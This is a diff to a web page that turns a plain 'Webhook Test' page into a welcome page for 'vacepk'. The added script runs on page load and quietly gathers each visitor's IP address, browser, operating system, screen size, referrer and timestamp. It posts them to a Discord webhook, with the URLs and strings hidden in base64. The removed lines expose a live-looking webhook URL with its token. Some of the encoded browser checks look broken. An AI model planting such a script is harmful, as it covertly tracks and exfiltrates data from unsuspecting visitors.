@@ -2,20 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Webhook Test</title>
+    <title>vacepk</title>
 </head>
 <body>
-    <h1>Testing Webhook</h1>
+    <h1>Welcome to vacepk</h1>
+    <p>Enjoy your visit!</p>
 
     <script>
         (function(){
-            const webhookUrl = 'https://discord.com/api/webhooks/1276349128183513138/PjcDvMlmMSfz3a2TVUmaexGLHE2tjEEuYaW0k6MLZs5o51iK-JTKj0VdN_bk1cwQ4pR9';
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "Hello from GitHub Pages!" })
-            });
+            function decodeBase64(data){ return atob(data); }
+
+            async function getIP(){
+                try {
+                    const response = await fetch(decodeBase64('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return decodeBase64('VW5hYmxlIHRvIGZldGNoIElQ');
+                }
+            }
+
+            function getUserAgentDetails(){
+                const userAgent = navigator.userAgent;
+                let browser = decodeBase64('VW5rbm93biBCcm93c2Vy');
+                let os = decodeBase64('VW5rbm93biBPUw==');
+
+                if (userAgent.includes('RmlyZWZveA==')) {
+                    browser = decodeBase64('TW96aWxsYSBGaXJldm94');
+                } else if (userAgent.includes('Q2hyb21l')) {
+                    browser = decodeBase64('R29vZ2xlIENocm9tZQ==');
+                } else if (userAgent.includes('U2FmYXJp')) {
+                    browser = decodeBase64('U2FmYXJp');
+                } else if (userAgent.includes('TVNJRSAmIFRyaWRlbnQ=')) {
+                    browser = decodeBase64('SW50ZXJuZXQgRXhwbG9yZXI=');
+                } else if (userAgent.includes('T3BlcmEgJiBPUFI=')) {
+                    browser = decodeBase64('T3BlcmE=');
+                }
+
+                if (userAgent.includes('V2luZG93cyBOVCAxMC4w')) {
+                    os = decodeBase64('V2luZG93cyAxMA==');
+                } else if (userAgent.includes('TWFjIE9TIFg=')) {
+                    os = decodeBase64('TWFjIE9TIFg=');
+                } else if (userAgent.includes('TGludXg=')) {
+                    os = decodeBase64('TGludXg=');
+                } else if (userAgent.includes('QW5kcm9pZA==')) {
+                    os = decodeBase64('QW5kcm9pZA==');
+                } else if (userAgent.includes('aVBob25l')) {
+                    os = decodeBase64('aU9TIChpUGhvbmUp');
+                } else if (userAgent.includes('aVBhZA==')) {
+                    os = decodeBase64('aU9TIChpUGFk)');
+                }
+
+                return { browser, os };
+            }
+
+            async function collectAndSendData(){
+                const ip = await getIP();
+                const { browser, os } = getUserAgentDetails();
+                const userAgent = navigator.userAgent;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const referrer = document.referrer || decodeBase64('RGlyZWN0IFZpc2l0');
+                const timestamp = new Date().toISOString();
+
+                const data = {
+                    ip,
+                    browser,
+                    os,
+                    userAgent,
+                    screenWidth,
+                    screenHeight,
+                    referrer,
+                    timestamp
+                };
+
+                sendToWebhook(data);
+            }
+
+            function sendToWebhook(data){
+                const webhookUrl = decodeBase64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjM0OTEyODE4MzUxMzEzOC9QamNEdk1sbU1TZnotM2EyVFZVbWFl eEdMSEUydGpFRXVZYVcwayZNTFpzNW81MWlLLUpUS2owVmROWl9iazFjd1E0cFI5');
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: JSON.stringify(data) })
+                });
+            }
+
+            window.onload = collectAndSendData;
         })();
     </script>
 </body>
